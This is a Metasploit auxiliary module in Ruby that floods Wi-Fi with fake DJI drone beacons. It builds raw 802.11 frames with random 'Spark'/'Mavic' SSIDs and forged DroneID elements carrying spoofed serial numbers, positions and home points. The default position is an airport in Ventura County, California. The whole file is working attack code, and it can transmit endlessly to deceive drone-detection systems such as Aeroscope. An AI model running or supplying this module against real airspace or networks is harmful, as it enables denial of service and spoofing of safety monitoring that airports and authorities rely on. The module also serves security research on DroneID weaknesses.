##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bindata'
require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Lorcon2
  include Msf::Auxiliary::Dos


  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DJI wifi based DroneID Fake Beacon Flood',
      'Description'    => %q{
        This module can advertise thousands of fake access
      points, using random "Spark-XXXXXX" and "Mavic-XXXXXX"
      SSIDs and BSSID addresses. Inspired by Black Alchemy's 
      fakeap tool.
      },

      'Author'         => [ 'hdm', 'kris katterjohn', 'kf' ],
      'License'        => MSF_LICENSE
    ))

    register_options([
      OptInt.new('NUM', [false, "Number of beacons to send"]),
      OptString.new('BSSID', [false, "Use this static BSSID (e.g. 60:60:1f:00:BE:EF)"]), # DJI Beef - https://www.youtube.com/watch?v=94bNyh6BBB0
      OptString.new('SSID', [false, "Use this static SSID"]),
      OptString.new('DRONEID', [false, "Serial Number for DroneID"]),
	  OptString.new('LAT', [false, "Current Latitude"]),
	  OptString.new('LON', [false, "Current Longitude"]),
	  OptString.new('HOMELAT', [false, "Home point Latitude"]),
	  OptString.new('HOMELON', [false, "Home point Longitude"]),
    ])
  end

  def run
    open_wifi
    print_status("Sending fake beacon frames...")
    if datastore['NUM'].nil? or datastore['NUM'] == 0
      wifi.write(create_frame()) while true
    else
      datastore['NUM'].times { wifi.write(create_frame()) }
    end
  end

	class DroneID < BinData::Record
	  uint64le :header
	  uint8 :sub_cmd
	  uint8 :ver
	  uint16le :seq
	  uint16le :state_info
	  string :sn, length: 16
	  int32le :latitude
	  int32le :longitude
	  int16le :altitude
	  int16le :height
	  int16le :v_north
	  int16le :v_east
	  int16le :v_up
	  int16le :pitch
	  int16le :roll
	  int16le :yaw
	  int32le :latitude_home
	  int32le :longitude_home
	  uint8 :product_type
	  uint8 :uuid_len
	  string :uuid, length: 20
	end

  def create_frame

    ssid = datastore['SSID'] || ["Spark-", "Mavic-"].sample + Rex::Text.rand_text(6, bad='', chars='abcdef0123456789')

    if datastore['BSSID']
      bssid = eton(datastore['BSSID'])
    else
      bssid = "\x60\x60\x1f" + Rex::Text.rand_text(3)
    end
    seq = [rand(255)].pack('v')
    rando_altitude = [rand(255)].pack('v')
    rando_height = [rand(255)].pack('v')
    rando_v_north = [rand(255)].pack('v')
    rando_v_east = [rand(255)].pack('v')
    rando_v_up = [rand(255)].pack('v')
    rando_pitch = [rand(255)].pack('v')
    rando_roll = [rand(255)].pack('v')
    rando_yaw = [rand(255)].pack('v')

    # DJI Aeroscope Test - How To Monitor Rogue Drones, a Hands On Test. (marketing video) 
	# https://www.youtube.com/watch?v=pDK_RlUXUlY
	# Featuring Nick Martino - Airport Supervisor, County of Ventura in the marketing video. 
	# Latitude: 34.3469439, Longitude: -119.0620484 for Santa Paula Airport, in Ventura County, California
	if datastore['LAT']
		lat = datastore['LAT'].to_f
	else
		lat = 34.3469439
	end
	if datastore['LON']
		lon = datastore['LON'].to_f
	else
		lon = -119.0620484
	end

	lat = (lat/180)* Math::PI * 10000000
	lon = (lon/180)* Math::PI * 10000000
	lat = [lat].pack("L*")
	lon = [lon].pack("L*")

	# Close to DJI home office in China

	if datastore['HOMELAT']
		homelat = datastore['HOMELAT'].to_f
	else
		homelat = 22.537021
	end
	if datastore['HOMELON']
		homelon = datastore['HOMELON'].to_f
	else
		homelon = 113.952322
	end

	homelat = (homelat/180)* Math::PI * 10000000
	homelon = (homelon/180)* Math::PI * 10000000
	homelat = [homelat].pack("L*")
	homelon = [homelon].pack("L*")

	if datastore['DRONEID'] && datastore['DRONEID'].length == 16
		sernum = datastore['DRONEID'] 
	else
		sernum = "DroneID is crap!" # Must be exactly 16 chars or the code will bomb out. Add checks later
	end

	droneID = ["\xDDR&7\x12Xb\x13", # Header
	"\x10", # Sub Command
	"\x01", # Version
	seq,
	"\xD7\x0F", # State Info
	sernum,
	lat,lon,
    rando_altitude,
	rando_height,
	rando_v_north,
	rando_v_east,
	rando_v_up,
	rando_pitch,
	rando_roll,
	rando_yaw,
	homelat, homelon,
	"\x10", # Product Type
	"\x06", # UUID Length
	Rex::Text.rand_text(6, bad='', chars='0123456789'), # UUID
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"] # UUID trailer
	droneID = droneID.join("")

	a = DroneID.new

	header = a.read(droneID)['header']
	sub_cmd = a.read(droneID)['sub_cmd']
	ver = a.read(droneID)['ver']
	sequence = a.read(droneID)['seq']
	state_info = a.read(droneID)['state_info']
	sn = a.read(droneID)['sn']
	latitude = a.read(droneID)['latitude']
	longitude = a.read(droneID)['longitude']
	altitude = a.read(droneID)['altitude']
	height = a.read(droneID)['height']
	v_north = a.read(droneID)['v_north']
	v_east = a.read(droneID)['v_east']
	v_up = a.read(droneID)['v_up']
	pitch = a.read(droneID)['pitch']
	roll = a.read(droneID)['roll']
	yaw = a.read(droneID)['yaw']
	latitude_home = a.read(droneID)['latitude_home']
	longitude_home = a.read(droneID)['longitude_home']
	product_type = a.read(droneID)['product_type']
	uuid_len = a.read(droneID)['uuid_len']
	uuid = a.read(droneID)['uuid']

	packet = [header.to_binary_s, sub_cmd.to_binary_s, ver.to_binary_s, sequence.to_binary_s, state_info.to_binary_s, sn.to_binary_s, latitude.to_binary_s, longitude.to_binary_s, altitude.to_binary_s, height.to_binary_s, v_north.to_binary_s, v_east.to_binary_s, v_up.to_binary_s, pitch.to_binary_s, roll.to_binary_s, yaw.to_binary_s, latitude_home.to_binary_s, longitude_home.to_binary_s, product_type.to_binary_s, uuid_len.to_binary_s, uuid.to_binary_s]

	print_status( [ssid, sn, (latitude * 180/Math::PI) / 10000000, (longitude * 180/Math::PI) / 10000000, (latitude_home* 180/Math::PI) / 10000000, (longitude_home* 180/Math::PI) / 10000000].join(" ") )

    "\x80" +                      # type/subtype
    "\x00" +                      # flags
    "\x00\x00" +                  # duration
    "\xff\xff\xff\xff\xff\xff" +  # dst
    bssid +                       # src
    bssid +                       # bssid
    seq   +                       # seq
    Rex::Text.rand_text(8) +      # timestamp value
    "\x64\x00" +                  # beacon interval
    "\x00\x05" +                  # capability flags

    # ssid tag
    "\x00" + ssid.length.chr + ssid +

    # supported rates
    "\x01" + "\x08" + "\x82\x84\x8b\x0c\x12\x96\x18\x24" +

    # current channel
    "\x03" + "\x01" + datastore['CHANNEL'].to_i.chr +

    # traffic indication map
    "\x05" + "\x04" + "\x00\x01\x00\x00" +

    # country information
    "\x07" + "\x06" + "\x55\x53\x00\x01\x0b\x1e" +

    # erp information
    "\x2a" + "\x01" + "\x00" +

    # extended supported rates
    "\x32" + "\x04" + "\x30\x48\x60\x6c" +

    # HT Capabilities
    "\x2d\x1a\xac\x01\x02\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
 
    # HT Information
    "\x3d\x16" + datastore['CHANNEL'].to_i.chr + "\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +

    # RSN Information
    "\x30\x14\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x04\x01\x00\x00\x0f\xac\x02\x0c\x00" +

    # Vendor Specific: Microsoft WMM/WME Paramater Element
    "\xdd\x18\x00\x50\xf2\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00" +

    # Vendor Specific: 26:37:12 (DJI) - DroneID
	packet.join("")

  end

end


